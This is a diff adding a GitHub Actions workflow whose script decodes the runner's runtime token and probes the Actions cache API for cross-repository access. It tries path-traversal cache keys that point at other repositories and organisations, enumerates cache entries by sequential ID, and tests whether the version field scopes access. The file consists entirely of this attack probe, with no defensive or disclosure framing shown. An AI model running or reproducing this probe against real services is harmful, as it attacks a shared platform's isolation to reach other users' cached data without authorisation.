@@ -1,0 +1,54 @@
+name: Cache Cross-Scope
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const cacheUrl = process.env.ACTIONS_CACHE_URL;
+            const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+            
+            console.log('Cache URL:', cacheUrl);
+            console.log('Token repo_id:', jwt.repository_id);
+            
+            const headers = { 'Authorization': `Bearer ${token}`, 'Accept': 'application/json;api-version=6.0-preview.1' };
+            
+            // 1. List OWN caches (baseline)
+            const own = await fetch(`${cacheUrl}_apis/artifactcache/cache?keys=build-cache-main-v1&version=*`, {headers});
+            console.log('\n=== Own cache lookup ===');
+            console.log(`${own.status}: ${(await own.text()).substring(0,200)}`);
+            
+            // 2. Try to reserve a cache with a key that includes path traversal
+            console.log('\n=== Cache reserve with traversal key ===');
+            for (const key of ['../private-test-repo/secret', '../../other-org/repo/key', 'normal-key']) {
+              const r = await fetch(`${cacheUrl}_apis/artifactcache/caches`, {
+                method: 'POST', headers: {...headers, 'Content-Type': 'application/json'},
+                body: JSON.stringify({key, version: 'test123'})
+              });
+              const t = await r.text();
+              console.log(`key="${key}": ${r.status} ${t.substring(0,100)}`);
+            }
+            
+            // 3. Try to get cache entries by ID (sequential)
+            console.log('\n=== Cache entry by numeric ID ===');
+            for (const id of [1, 2, 100, 1000]) {
+              const r = await fetch(`${cacheUrl}_apis/artifactcache/caches/${id}`, {headers});
+              if (r.status !== 404) {
+                console.log(`ID ${id}: ${r.status} ${(await r.text()).substring(0,100)}`);
+              }
+            }
+            
+            // 4. Try to upload to a cache (does version act as scope?)
+            console.log('\n=== Cache version as scope test ===');
+            // Reserve with our repo's version
+            const reserve = await fetch(`${cacheUrl}_apis/artifactcache/caches`, {
+              method: 'POST', headers: {...headers, 'Content-Type': 'application/json'},
+              body: JSON.stringify({key: 'xscope-test', version: 'aaaa'})
+            });
+            const rt = await reserve.text();
+            console.log(`Reserve: ${reserve.status} ${rt.substring(0,100)}`);
